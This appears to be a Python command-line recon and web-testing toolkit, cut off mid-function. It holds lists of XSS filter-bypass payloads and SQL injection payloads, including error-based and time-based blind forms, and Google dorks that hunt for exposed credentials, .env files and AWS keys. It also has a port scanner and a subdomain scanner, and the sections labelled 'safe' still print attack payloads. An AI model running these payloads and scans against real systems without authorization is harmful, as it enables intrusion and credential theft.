#!/usr/bin/env python3
# ==========================================
# VLUXGEN v2.0
# Professional CLI Security Learning Toolkit
# ==========================================

import itertools
import string
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import sys
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
import os
import socket
from concurrent.futures import ThreadPoolExecutor
import threading
import asyncio
import aiohttp
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import random, string
# =========================
# COLORS
# =========================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
RESET = "\033[0m"


# =========================
# BANNER DESIGN
# =========================
def banner():
    print(CYAN + """
┌──────────────────────────────────────────────────────────┐
│                                                          │
│ ██    ██ ██      ██    ██ ██   ██  ██████   ███████ ███  │
│ ██    ██ ██      ██    ██  ██ ██  ██       ██      ████  │
│ ██    ██ ██      ██    ██   ███   ██   ███ █████   ██ ██ │
│  ██  ██  ██      ██    ██  ██ ██  ██    ██ ██      ██  ██│
│   ████   ███████  ██████  ██   ██  ██████  ███████ ██   █│
│                                                          │
│        VLUXGEN v2.0  |  Security Learning Toolkit        │
│        Recon • Wordlist • Crawl • Safe Testing           |
│                                                          |
│                                -CYBER PASANGA (SRIRAM)   │
└──────────────────────────────────────────────────────────┘
""" + RESET)


# =========================
# LOADING EFFECT  B  
# =========================
def loading(msg):
    print(YELLOW + f"[+] {msg}", end="", flush=True)
    for _ in range(3):
        time.sleep(0.3)
        print(".", end="", flush=True)
    print(RESET)


# =====================================================
# WORDLIST GENERATOR
# =====================================================
def wordlist_generator():
    print(MAGENTA + "\n[ WORDLIST GENERATOR ]\n" + RESET)

    length = int(input("Length      : "))
    alpha = input("Letters y/n : ").lower() == "y"
    num = input("Numbers y/n : ").lower() == "y"
    special = input("Special y/n : ").lower() == "y"
    filename = input("Output file : ")

    chars = ""
    if alpha: chars += string.ascii_letters
    if num: chars += string.digits
    if special: chars += "!@#$%&*"

    loading("Generating wordlist")

    with open(filename, "w") as f:
        for c in itertools.product(chars, repeat=length):
            f.write("".join(c) + "\n")

    print(GREEN + f"[✓] Saved -> {filename}\n" + RESET)


# =====================================================
# WEBSITE CRAWLER
# =====================================================
def crawler():
    print(MAGENTA + "\n[ ADVANCED WEB CRAWLER ]\n" + RESET)

    # ===== INPUT =====
    start_url = input("Target URL            : ").strip()
    depth = int(input("Depth level (1-5)     : ") or 2)
    threads = int(input("Threads               : ") or 10)
    delay = float(input("Delay (sec, 0 skip)   : ") or 0)
    filename = input("Output file name      : ").strip() or "crawl"

    if not filename.endswith(".txt"):
        filename += ".txt"

    domain = urlparse(start_url).netloc

    # ===== SAFE STRUCTURES =====
    visited = set()
    lock = threading.Lock()
    found = 0

    queue = [(start_url, 0)]

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (CrawlerTool)"

    print("\n[+] Crawling started...\n")

    # ==============================
    # FETCH LINKS FUNCTION
    # ==============================
    def extract(url, level):
        links = []

        if level > depth:
            return links

        try:
            r = session.get(url, timeout=6)
            soup = BeautifulSoup(r.text, "html.parser")

            # ----- anchor -----
            for a in soup.find_all("a", href=True):
                links.append(urljoin(url, a["href"]))

            # ----- scripts -----
            for s in soup.find_all("script", src=True):
                links.append(urljoin(url, s["src"]))

            # ----- forms -----
            for form in soup.find_all("form"):
                action = form.get("action")
                if action:
                    links.append(urljoin(url, action))

            return links

        except:
            return links

    # ==============================
    # CRAWLING
    # ==============================
    with open(filename, "w", encoding="utf-8") as f:

        while queue:
            batch = queue[:threads]
            queue = queue[threads:]

            with ThreadPoolExecutor(max_workers=threads) as executor:
                results = executor.map(lambda x: extract(x[0], x[1]), batch)

            for (url, level), new_links in zip(batch, results):

                with lock:
                    if url not in visited:
                        visited.add(url)
                        f.write(url + "\n")

                for link in new_links:
                    parsed = urlparse(link)

                    # ----- SAME DOMAIN ONLY -----
                    if parsed.netloc != domain:
                        continue

                    with lock:
                        if link not in visited:
                            queue.append((link, level + 1))
                            visited.add(link)
                            f.write(link + "\n")
                            found += 1

                            if "?" in link:
                                print(YELLOW + "[PARAM] " + link + RESET)
                            elif link.endswith(".js"):
                                print(CYAN + "[JS] " + link + RESET)
                            else:
                                print(GREEN + "[+] " + link + RESET)

    # ==============================
    # SUMMARY
    # ==============================
    size_kb = os.path.getsize(filename) / 1024

    print(GREEN + "\n[✓] CRAWLING COMPLETED" + RESET)
    print(f"   URLs Found : {found}")
    print(f"   Saved File : {os.path.abspath(filename)}")
    print(f"   Size       : {size_kb:.2f} KB\n")


# =====================================================
# PARAMETER FINDER
# =====================================================
def parameter_finder():
    print(MAGENTA + "\n[ ADVANCED PARAMETER FINDER PRO ]\n" + RESET)

    # =========================
    # INPUT
    # =========================
    start_url = input("Target URL              : ").strip()

    if not start_url.startswith(("http://", "https://")):
        print("Invalid URL! Include http/https\n")
        return

    try:
        depth = int(input("Depth level (1-5)       : ") or 2)
        threads = int(input("Threads                 : ") or 10)
    except ValueError:
        print("Invalid number input!\n")
        return

    filename = input("Output file name        : ").strip() or "parameters"

    if not filename.endswith(".txt"):
        filename += ".txt"

    domain = urlparse(start_url).netloc

    # =========================
    # SAFE STRUCTURES
    # =========================
    visited = set()
    params_found = set()
    queue = [(start_url, 0)]
    lock = threading.Lock()
    total_scanned = 0

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (AdvancedParamFinder)"

    print("\n[+] Crawling & discovering parameters...\n")

    # =========================
    # SCAN FUNCTION
    # =========================
    def scan(url, level):

        if level > depth:
            return [], []

        links = []
        parameters = []

        try:
            res = session.get(url, timeout=6)

            if not res.text:
                return [], []

            soup = BeautifulSoup(res.text, "html.parser")

            # -------- URL query params --------
            parsed = urlparse(url)
            for p in parse_qs(parsed.query):
                parameters.append((url, p))

            # -------- FORMS --------
            for form in soup.find_all("form"):
                action = urljoin(url, form.get("action", ""))

                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name:
                        parameters.append((action, name))

                links.append(action)

            # -------- JS endpoints --------
            for script in soup.find_all("script", src=True):
                links.append(urljoin(url, script["src"]))

            # -------- Anchor links --------
            for a in soup.find_all("a", href=True):
                links.append(urljoin(url, a["href"]))

        except requests.RequestException:
            pass

        return links, parameters


    # =========================
    # MAIN LOOP
    # =========================
    with open(filename, "w", encoding="utf-8") as file:

        while queue:
            batch = queue[:threads]
            queue = queue[threads:]

            with ThreadPoolExecutor(max_workers=threads) as executor:
                results = list(executor.map(lambda x: scan(x[0], x[1]), batch))

            for (url, level), (new_links, params) in zip(batch, results):

                with lock:
                    if url in visited:
                        continue
                    visited.add(url)
                    total_scanned += 1

                # -------- SAVE PARAMETERS --------
                for base, param in params:
                    entry = f"{base}  ->  {param}"

                    with lock:
                        if entry not in params_found:
                            params_found.add(entry)
                            file.write(entry + "\n")
                            print(RED + "[PARAM] " + entry + RESET)

                # -------- ADD LINKS --------
                for link in new_links:
                    parsed = urlparse(link)

                    if parsed.netloc == domain:
                        with lock:
                            if link not in visited:
                                queue.append((link, level + 1))


    # =========================
    # SUMMARY
    # =========================
    size_kb = os.path.getsize(filename) / 1024

    print(GREEN + "\n[✓] SCAN COMPLETED SUCCESSFULLY" + RESET)
    print(f"   Pages Scanned     : {total_scanned}")
    print(f"   Parameters Found  : {len(params_found)}")
    print(f"   Saved File        : {os.path.abspath(filename)}")
    print(f"   Size              : {size_kb:.2f} KB\n")
# =====================================================
# GOOGLE DORK GENERATOR
# =====================================================
def google_dork():
    print(MAGENTA + "\n[ ADVANCED GOOGLE DORK GENERATOR PRO ]\n" + RESET)

    domain = input("Target domain (example.com): ").strip()

    if not domain:
        print("Domain required!\n")
        return

    filename = input("Output file name (ENTER=dorks): ").strip() or "dorks"

    if not filename.endswith(".txt"):
        filename += ".txt"

    print("\n[+] Generating dorks...\n")

    dorks = set()

    # =================================
    # FILE LEAKS
    # =================================
    filetypes = [
        "sql","db","log","txt","json","xml","env","bak","backup",
        "zip","tar","gz","rar","7z","config","ini","yml","csv"
    ]

    for f in filetypes:
        dorks.add(f"site:{domain} filetype:{f}")

    # =================================
    # ADMIN PANELS
    # =================================
    admin_paths = [
        "admin","login","dashboard","cpanel","portal","backend",
        "manager","signin","user","account","control"
    ]

    for p in admin_paths:
        dorks.add(f"site:{domain} inurl:{p}")

    # =================================
    # SENSITIVE KEYWORDS
    # =================================
    sensitive = [
        "password","passwd","secret","apikey","token","private",
        "credentials","config","backup","dump","database"
    ]

    for s in sensitive:
        dorks.add(f"site:{domain} \"{s}\"")

    # =================================
    # CLOUD / DEVOPS
    # =================================
    cloud = [
        "aws_access_key_id",
        "aws_secret_access_key",
        ".git/config",
        ".env",
        "docker-compose",
        "kubernetes",
        "jenkins",
        "gitlab-ci"
    ]

    for c in cloud:
        dorks.add(f"site:{domain} \"{c}\"")

    # =================================
    # INDEX LISTING
    # =================================
    dorks.add(f"site:{domain} \"index of /\"")
    dorks.add(f"site:{domain} intitle:\"index of\"")
    dorks.add(f"site:{domain} parent directory")

    # =================================
    # API / ENDPOINTS
    # =================================
    api = ["api", "v1", "v2", "graphql", "swagger", "docs"]

    for a in api:
        dorks.add(f"site:{domain} inurl:{a}")

    # =================================
    # CUSTOM KEYWORD OPTION
    # =================================
    custom = input("Add custom keyword (ENTER skip): ").strip()
    if custom:
        dorks.add(f"site:{domain} \"{custom}\"")

    # =================================
    # SAVE FILE
    # =================================
    with open(filename, "w", encoding="utf-8") as f:
        for d in sorted(dorks):
            f.write(d + "\n")

    print(GREEN)
    for d in sorted(dorks):
        print(d)

    print(RESET)

    print(GREEN + "\n[✓] Dorks Generated Successfully" + RESET)
    print(f"   Total  : {len(dorks)}")
    print(f"   Saved  : {os.path.abspath(filename)}\n")
# =====================================================
# SAFE REFLECTION TEST
# =====================================================
def safe_xss_test():
    print(MAGENTA + "\n[ XSS PAYLOAD GENERATOR - EDUCATIONAL ]\n" + RESET)

    filename = input("File name (default=xss_payloads.txt): ").strip() or "xss_payloads.txt"

    # force txt
    if not filename.endswith(".txt"):
        filename += ".txt"

    payloads = {
         "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "VLUXGEN_XSS_TEST",

    # =========================
    # 1. CASE TOGGLING
    # =========================
    "<ScRipT>alert(1)</sCRipT>",
    "<sCrIpT>confirm(1)</ScRiPt>",

    # =========================
    # 2. URL ENCODING
    # =========================
    "%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F",
    "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",

    # =========================
    # 3. UNICODE NORMALIZATION
    # =========================
    "<marquee onstart=\\u0061l\\u0065rt(1)>",
    "＜marquee loop＝1 onfinish＝alert︵1)>x",
    "http://google。com",

    # =========================
    # 4. HTML REPRESENTATION
    # =========================
    "&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;",
    "&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;",

    # =========================
    # 5. MIXED ENCODING
    # =========================
    "<A HREF=\"h\ntt  p://6   6.000146.0x7.147/\">XSS</A>",

    # =========================
    # 6. COMMENTS OBFUSCATION
    # =========================
    "<!--><script>alert/**/(1)/**/</script>",
    "<script>al/**/ert(1)</script>",

    # =========================
    # 7. DOUBLE ENCODING
    # =========================
    "%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E",

    # =========================
    # 8. WILDCARD OBFUSCATION
    # =========================
    "/???/??t /???/??ss??",

    # =========================
    # 9. DYNAMIC PAYLOADS
    # =========================
    "<script>eval('al'+'er'+'t(1)')</script>",
    "<iframe/onload='this[\"src\"]=\"jav\"+\"as\"+\"cript:alert(1)\"'>",

    # =========================
    # 10. JUNK CHARACTERS
    # =========================
    "<script>+-+-1-+-+alert(1)</script>",
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(1)>",

    # =========================
    # 11. LINE BREAKS (CR/LF)
    # =========================
    "<iframe src=\"%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)\">",

    # =========================
    # 12. TABS & LINE FEEDS
    # =========================
    "<IMG SRC=\"    javascript:alert(1);\">",
    "<IMG SRC=\"    jav    ascri    pt:alert    (1);\">",

    "<iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>"
       "<script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\"><script>alert(1)</script>",

        # ===== attributes =====
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",

        # ===== encoded =====
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&lt;script&gt;alert(1)&lt;/script&gt;",

        # ===== case variation =====
        "<ScRipT>alert(1)</sCRipT>",

        # ===== comments =====
        "<script>al/**/ert(1)</script>",

        # ===== string split =====
        "<script>eval('al'+'ert(1)')</script>",

        # ===== event handlers =====
        "<input onfocus=alert(1) autofocus>",
        "<details ontoggle=alert(1) open>",
        "<marquee onstart=alert(1)>",
        
        
        
        }
    

    loading("Saving payloads")

    with open(filename, "w", encoding="utf-8") as f:
        for p in sorted(payloads):
            f.write(p + "\n")

    print(GREEN + f"[✓] Saved {len(payloads)} payloads" + RESET)
    print(CYAN + f"[📄] File -> {os.path.abspath(filename)}\n" + RESET)

# =====================================================
# SAFE SQL ERROR CHECK
# =====================================================
def safe_sqli_test():
    print(MAGENTA + "\n[ SQLi PAYLOAD GENERATOR ]\n" + RESET)

    filename = input("Save payload file (ENTER=sqli_payloads.txt): ").strip() or "sqli_payloads.txt"

    payloads = [

        # -----------------------
        # BASIC BREAKERS
        # -----------------------
        "'", '"', "`", "')", '")',

        # -----------------------
        # BOOLEAN BASED
        # -----------------------
        "' OR 1=1--",
        "' AND 1=2--",
        "' OR 'a'='a",
        "' AND 'a'='b",
        "' OR TRUE--",
        "' AND FALSE--",

        # -----------------------
        # COMMENT BYPASS
        # -----------------------
        "'--",
        "'#",
        "'/*",
        "'-- -",

        # -----------------------
        # UNION TESTS (safe only)
        # -----------------------
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2--",
        "' UNION ALL SELECT NULL,NULL--",

        # -----------------------
        # ERROR BASED
        # -----------------------
        "' ORDER BY 9999--",
        "' GROUP BY 9999--",
        "' HAVING 1=1--",

        # -----------------------
        # TIME BASED
        # -----------------------
        "' OR SLEEP(3)--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR pg_sleep(3)--",

        # -----------------------
        # ENCODING BYPASS
        # -----------------------
        "%27 OR 1=1--",
        "%22 OR 1=1--",
        "%2527 OR 1=1--",

        # -----------------------
        # LOGIC TESTS
        # -----------------------
        "' AND 2>1--",
        "' AND 2<1--",
        "' OR 5=5--",
        "' OR 5=6--",

        # -----------------------
        # NULL BYTE
        # -----------------------
        "'%00",
        "\"%00",

        # -----------------------
        # STACKED SAFE
        # -----------------------
        "'; SELECT 1--",
        "'; SELECT 'test'--"
# -------------------------
    # BASIC QUOTE BREAKERS
    # -------------------------
    "'", '"', "`", "')", '")', "';", "\";", "`;",

    # -------------------------
    # BOOLEAN TRUE/FALSE
    # -------------------------
    "' OR 1=1--",
    "' AND 1=2--",
    "' OR 'a'='a",
    "' AND 'a'='b",
    " OR 1=1",
    " AND 1=2",
    "' OR TRUE--",
    "' AND FALSE--",
    "') OR ('1'='1",
    "') AND ('1'='2",

    # -------------------------
    # COMMENT BYPASS STYLES
    # -------------------------
    "'--",
    "'#",
    "'/*",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 1=1-- -",
    "'--+",
    "';%00",

    # -------------------------
    # ORDER/GROUP ERRORS
    # -------------------------
    "' ORDER BY 9999--",
    "' GROUP BY 9999--",
    "' HAVING 1=1--",
    "' ORDER BY 100--",
    "' GROUP BY 1,2,3--",

    # -------------------------
    # UNION SAFE TESTS (NO DATA)
    # -------------------------
    "' UNION SELECT NULL--",
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL--",

    # -------------------------
    # MYSQL ERROR TRIGGERS
    # -------------------------
    "' AND updatexml(1,concat(0x7e,user()),1)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

    # -------------------------
    # MSSQL ERROR TRIGGERS
    # -------------------------
    "'; WAITFOR DELAY '0:0:3'--",
    "'; SELECT @@version--",
    "' AND 1=CONVERT(int,'abc')--",

    # -------------------------
    # POSTGRESQL TESTS
    # -------------------------
    "' OR pg_sleep(3)--",
    "'||(SELECT version())||'",
    "' AND CAST(version() AS int)--",

    # -------------------------
    # SQLITE TESTS
    # -------------------------
    "' AND randomblob(1000000)--",
    "'||(SELECT sqlite_version())||'",

    # -------------------------
    # TIME DELAY (BLIND)
    # -------------------------
    "' OR SLEEP(3)--",
    "' AND SLEEP(5)--",
    "' OR BENCHMARK(1000000,MD5(1))--",

    # -------------------------
    # ENCODING / FILTER BYPASS
    # -------------------------
    "%27 OR 1=1--",
    "%22 OR 1=1--",
    "%27%20OR%201=1--",
    "%2527 OR 1=1--",
    "%2F%2A OR 1=1--",

    # -------------------------
    # LOGIC COMPARISON TESTS
    # -------------------------
    "' AND LENGTH(database())>1--",
    "' AND ASCII(SUBSTRING('A',1,1))>64--",
    "' AND 2>1--",
    "' AND 2<1--",

    # -------------------------
    # NULL BYTE TESTS
    # -------------------------
    "'%00",
    "\"%00",
    "`%00",

    # -------------------------
    # STACKED SAFE TESTS
    # -------------------------
    "'; SELECT 1--",
    "'; SELECT 2--",
    "'; SELECT 'test'--",

    # -------------------------
    # RANDOM EDGE CASES
    # -------------------------
    "')--",
    "'||'a'='a",
    "' OR 'x' LIKE 'x",
    "' AND 1 BETWEEN 1 AND 2--"
    ]

    print(CYAN + f"\nGenerated {len(payloads)} payloads:\n" + RESET)

    for p in payloads:
        print(p)

    # save file
    with open(filename, "w") as f:
        for p in payloads:
            f.write(p + "\n")

    print(GREEN + f"\n[✓] Saved payloads to {filename}\n" + RESET)


# =====================================================
# SUBDOMAIN FINDER
# =====================================================
def subdomain_finder():
    def subdomain_finder():
        print(MAGENTA + "\n[ SUBDOMAIN FINDER ]\n" + RESET)

    import socket
    import requests
    import os
    from concurrent.futures import ThreadPoolExecutor, as_completed

    domain = input("Target domain (example.com): ").strip()
    filename = input("Output file (ENTER=subdomains.txt): ").strip() or "subdomains.txt"

    if not filename.endswith(".txt"):
        filename += ".txt"

    # -----------------------------
    # Large default wordlist
    # (add more if you want)
    # -----------------------------
    words = [
        "www","mail","ftp","dev","test","api","beta","admin","portal","vpn",
        "blog","shop","staging","cdn","static","img","m","mobile","app",
        "dashboard","panel","server","cloud","data","db","backup","files",
        "docs","support","help","news","demo","secure","auth","gateway",
        "intranet","office","internal","status","upload","download"
    ]

    found = []

    print(CYAN + "\nScanning subdomains...\n" + RESET)

    # -----------------------------
    # DNS check
    # -----------------------------
    def resolve(host):
        try:
            return socket.gethostbyname(host)
        except:
            return None

    # -----------------------------
    # HTTP check
    # -----------------------------
    def check_http(host):
        for proto in ["http://", "https://"]:
            try:
                r = requests.get(proto + host, timeout=3)
                return r.status_code
            except:
                continue
        return None

    # -----------------------------
    # Worker (threaded)
    # -----------------------------
    def worker(sub):
        host = f"{sub}.{domain}"
        ip = resolve(host)

        if not ip:
            return None

        status = check_http(host)
        return host, ip, status

    # -----------------------------
    # Threaded scanning
    # -----------------------------
    with ThreadPoolExecutor(max_workers=80) as executor:
        futures = [executor.submit(worker, s) for s in words]

        for f in as_completed(futures):
            result = f.result()
            if result:
                host, ip, status = result
                print(GREEN + f"[✓] {host} -> {ip} | {status}" + RESET)
                found.append(host)

    # -----------------------------
    # Save file
    # -----------------------------
    with open(filename, "w") as f:
        for s in found:
            f.write(s + "\n")

    print(GREEN + f"\n[✓] Found {len(found)} subdomains")
    print(CYAN + f"[📄] Saved -> {os.path.abspath(filename)}\n" + RESET)

# =====================================================
# WAF DETECTOR
# =====================================================
def waf_detector():
    print(MAGENTA + "\n[ WAF DETECTOR ]\n" + RESET)

    url = input("Target URL: ").strip()
    output_file = input("Save result file: ").strip()

    if not output_file:
        output_file = "waf_result.txt"

    results = []
    results.append("[ WAF DETECTOR ]")
    results.append(f"Target URL: {url}\n")

    try:
        r = requests.get(url, timeout=6)
        headers = str(r.headers).lower()

        wafs = {
            "cloudflare": "Cloudflare",
            "akamai": "Akamai",
            "imperva": "Imperva",
            "sucuri": "Sucuri",
            "f5": "F5 BIG-IP",
            "barracuda": "Barracuda",
            "fortiweb": "Fortinet",
            "mod_security": "ModSecurity"
        }

        detected = []

        for key, name in wafs.items():
            if key in headers:
                detected.append(name)

        print("\nScan Result:\n")
        results.append("Scan Result:\n")

        if detected:
            print(RED + "[!] WAF Detected:" + RESET)
            results.append("[!] WAF Detected:")

            for d in detected:
                print("   -", d)
                results.append("   - " + d)
        else:
            print(GREEN + "[✓] No common WAF detected" + RESET)
            results.append("[✓] No common WAF detected")

        # Save results
        with open(output_file, "w") as f:
            f.write("\n".join(results))

        print(GREEN + f"\n[✓] Results saved to {output_file}\n" + RESET)

    except:
        print("Request failed\n")


       # =====================================================
#
# ⚡ VLUXGEN-P (NMAP STYLE PORT SCANNER)
# =====================================================
import socket
import time
from concurrent.futures import ThreadPoolExecutor


def port_scanner():

    print(MAGENTA + "\n[ VLUXGEN-P PORT SCANNER ]\n" + RESET)

    target = input("Target (domain/IP): ").strip()
    start_port = 1
    end_port = 1000
    threads = 300

    start_time = time.time()

    # -------------------------
    # Resolve host
    # -------------------------
    ip = socket.gethostbyname(target)

    print(f"\nStarting VLUXGEN-P 2.0 ( https://vluxgen.local )")
    print(f"VLUXGEN scan report for {target} ({ip})")

    try:
        latency_test = socket.create_connection((ip, 80), timeout=2)
        latency_test.close()
        print("Host is up.")
    except:
        print("Host seems down.")
        return

    open_ports = []
    filtered = 0

    # -------------------------
    # Scan function
    # -------------------------
    def scan(port):
        nonlocal filtered

        s = socket.socket()
        s.settimeout(0.6)

        result = s.connect_ex((ip, port))

        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"

            open_ports.append((port, service))
        else:
            filtered += 1

        s.close()

    # -------------------------
    # Threaded scan
    # -------------------------
    with ThreadPoolExecutor(max_workers=threads) as exe:
        exe.map(scan, range(start_port, end_port + 1))

    # -------------------------
    # Output like NMAP
    # -------------------------
    closed_count = (end_port - start_port + 1) - len(open_ports)

    print(f"Not shown: {closed_count} filtered tcp ports (no-response)\n")

    print("PORT\tSTATE\tSERVICE")

    for port, service in sorted(open_ports):
        print(GREEN + f"{port}/tcp\topen\t{service}" + RESET)

    elapsed = time.time() - start_time

    print(f"\nVLUXGEN done: 1 IP address (1 host up) scanned in {elapsed:.2f} seconds\n")



# =====================================================
# 🔐 VLUXGEN MASTER SECURITY HEADER AUDITOR
# Professional Clickjacking + Header Security Scanner
# =====================================================

import requests
import json
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor


def header_auditor():

    print(MAGENTA + "\n[ VLUXGEN MASTER SECURITY HEADER AUDITOR ]\n" + RESET)

    target = input("Target URL or file (urls.txt): ").strip()

    # ----------------------------------------
    # Load targets (single or multiple)
    # ----------------------------------------
    targets = []

    if target.endswith(".txt"):
        with open(target) as f:
            targets = [x.strip() for x in f if x.strip()]
    else:
        targets = [target]

    results_all = []

    # ----------------------------------------
    # Core Scanner
    # ----------------------------------------
    def scan(url):

        if not url.startswith(("http://", "https://")):
            url = "http://" + url

        result_data = {
            "url": url,
            "issues": [],
            "score": 0
        }

        try:
            r = requests.get(url, timeout=6, allow_redirects=True)
            headers = {k.lower(): v for k, v in r.headers.items()}
        except:
            print(RED + f"[✗] {url} -> Request Failed" + RESET)
            return

        score = 0
        total = 12

        print(CYAN + f"\n===== {url} =====" + RESET)

        # helper
        def check(name, condition, good, bad):
            nonlocal score

            if condition:
                score += 1
                print(GREEN + f"[✓] {name}: {good}" + RESET)
            else:
                print(RED + f"[✗] {name}: {bad}" + RESET)
                result_data["issues"].append(f"{name} missing/misconfigured")


        # ---------------------------
        # HEADER CHECKS
        # ---------------------------

        check("CSP",
              "content-security-policy" in headers,
              "Present",
              "Missing → XSS risk")

        check("X-Frame-Options",
              "x-frame-options" in headers,
              headers.get("x-frame-options"),
              "Missing → Clickjacking possible")

        check("HSTS",
              "strict-transport-security" in headers,
              "HTTPS enforced",
              "Missing")

        check("X-Content-Type-Options",
              headers.get("x-content-type-options") == "nosniff",
              "nosniff",
              "Missing")

        check("Referrer-Policy",
              "referrer-policy" in headers,
              headers.get("referrer-policy"),
              "Missing")

        check("Permissions-Policy",
              "permissions-policy" in headers,
              "Restricted",
              "Missing")

        check("Cache-Control",
              "cache-control" in headers,
              headers.get("cache-control"),
              "Sensitive data may cache")

        check("Set-Cookie Secure",
              "secure" in str(headers.get("set-cookie", "")).lower(),
              "Secure cookies",
              "Cookies not secure")

        check("Set-Cookie HttpOnly",
              "httponly" in str(headers.get("set-cookie", "")).lower(),
              "HttpOnly cookies",
              "JS can access cookies")

        check("Server Leakage",
              "server" not in headers,
              "Hidden",
              f"Server exposed: {headers.get('server')}")

        check("CORS Policy",
              headers.get("access-control-allow-origin") not in ["*", None],
              "Restricted",
              "Wildcard CORS (*)")

        parsed = urlparse(url)
        check("HTTPS",
              parsed.scheme == "https",
              "Secure",
              "HTTP only")


        # ---------------------------
        # Score system
        # ---------------------------
        percent = int((score / total) * 100)

        if percent >= 90:
            grade, color = "A", GREEN
        elif percent >= 75:
            grade, color = "B", GREEN
        elif percent >= 60:
            grade, color = "C", YELLOW
        elif percent >= 40:
            grade, color = "D", YELLOW
        else:
            grade, color = "F", RED

        print(color + f"\nSecurity Score → {grade} ({percent}%)\n" + RESET)

        result_data["score"] = percent
        result_data["grade"] = grade

        results_all.append(result_data)


    # ----------------------------------------
    # FAST THREADED SCAN
    # ----------------------------------------
    with ThreadPoolExecutor(max_workers=10) as exe:
        exe.map(scan, targets)


    # ----------------------------------------
    # SAVE REPORTS
    # ----------------------------------------
    save = input("Save reports? (y/n): ").lower()

    if save == "y":

        # TXT
        with open("vluxgen_header_report.txt", "w") as f:
            for r in results_all:
                f.write(f"{r['url']} -> {r['grade']} ({r['score']}%)\n")
                for i in r["issues"]:
                    f.write("  - " + i + "\n")
                f.write("\n")

        # JSON
        with open("vluxgen_header_report.json", "w") as f:
            json.dump(results_all, f, indent=4)

        print(GREEN + "\n[✓] Reports saved (TXT + JSON)\n" + RESET)


        # =====================================================
# 🔥 VLUXGEN ULTIMATE XSS FRAMEWORK (PRO SAFE EDITION)
# Professional Detection Engine (no exploit payloads)
# =====================================================
# =====================================================
# 🔥 VLUXGEN MASTER SAFE XSS ANALYZER (PRO)
# Reflection + Context Detection (NO EXPLOIT PAYLOADS)
# =====================================================

import requests
import random
import string
import threading
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor


def xss_master_scanner():

    print(MAGENTA + "\n[ VLUXGEN MASTER XSS ANALYZER - SAFE MODE ]\n" + RESET)

    start_url = input("Target URL: ").strip()
    depth = int(input("Depth (default 2): ") or 2)
    threads = int(input("Threads (default 30): ") or 30)

    session = requests.Session()
    session.headers["User-Agent"] = "VLUXGEN-XSS-PRO"

    domain = urlparse(start_url).netloc

    visited = set()
    parameters = []
    results = []
    lock = threading.Lock()


    # ------------------------------
    # unique marker (safe)
    # ------------------------------
    def marker():
        return "VLX" + ''.join(random.choice(string.ascii_letters) for _ in range(10))


    # ------------------------------
    # crawl and find parameters
    # ------------------------------
    def crawl(url, level):

        if level > depth or url in visited:
            return []

        visited.add(url)

        links = []

        try:
            r = session.get(url, timeout=5)
            soup = BeautifulSoup(r.text, "html.parser")

            parsed = urlparse(url)

            for p in parse_qs(parsed.query):
                parameters.append((url, "GET", p))

            for form in soup.find_all("form"):

                action = urljoin(url, form.get("action", ""))

                method = form.get("method", "GET").upper()

                for inp in form.find_all(["input", "textarea"]):
                    name = inp.get("name")
                    if name:
                        parameters.append((action, method, name))

                links.append(action)

            for a in soup.find_all("a", href=True):
                link = urljoin(url, a["href"])
                if urlparse(link).netloc == domain:
                    links.append(link)

        except:
            pass

        return [(l, level+1) for l in links]


    # ------------------------------
    # context detector (advanced)
    # ------------------------------
    def detect_context(body, mark):

        if f'"{mark}"' in body or f"'{mark}'" in body:
            return "Attribute/HTML context"

        elif f"<{mark}" in body:
            return "Tag injection context"

        elif mark in body:
            return "Plain reflection"

        return "Not reflected"


    # ------------------------------
    # test parameter safely
    # ------------------------------
    def test_param(url, method, param):

        test_value = marker()

        try:
            if method == "GET":
                r = session.get(url, params={param: test_value}, timeout=5)
            else:
                r = session.post(url, data={param: test_value}, timeout=5)

            if test_value in r.text:

                ctx = detect_context(r.text, test_value)

                msg = f"{url} | {param} | {ctx}"

                with lock:
                    print(YELLOW + "[REFLECTED] " + msg + RESET)
                    results.append(msg)

        except:
            pass


    # ------------------------------
    # crawl
    # ------------------------------
